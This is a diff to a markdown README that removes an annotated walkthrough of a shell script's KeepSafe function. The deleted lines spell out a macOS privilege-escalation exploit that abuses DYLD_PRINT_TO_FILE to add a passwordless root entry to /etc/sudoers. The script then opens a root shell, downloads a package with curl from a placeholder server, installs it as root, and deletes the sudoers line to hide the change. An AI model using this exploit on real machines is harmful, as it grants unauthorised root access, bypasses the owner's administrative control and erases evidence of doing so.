@@ -28,25 +28,3 @@ We first remove the temporary directory used to store the Java package during in
 __5. `function KeepSafe { }` & `trap`__
 <br>
 This is used to ensure the completion of the command if it fails.
-
-<br>
-
-<br>
-
-## IN-DEPTH LOOK AT `function KeepSafe { }` COMMANDS ##
-
-`echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;` ___- Exploit the machine___
-<br>
-`sudo bash -c ` ___- Create a root bash shell___
-<br>
-`if [[ $EUID -ne 0 ]]; then echo -e "\033[1mFailed! No root!\033[0m $(exit 1)";` ___- Check if the exploit actually worked, if not, exit the script___
-<br>
-`sudo mkdir -v /tmp$$;` ___- Make a temporary directory to store the package in___
-<br>
-`sudo curl -# http://<SERVER_ADDRESS>/Java_8_Update_60.pkg > /tmp$$/Java_8_Update_60.pkg;` ___- Get the package___
-<br>
-`sudo installer -verbose -pkg /tmp$$/Java_8_Update_60.pkg -target LocalSystem;` - ___Install the package___
-<br>
-`sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers;` ___- Remove the line allowing root access without a password___
-<br>
-`rm -rfv /tmp$$;` ___- Remove the temporary directory___
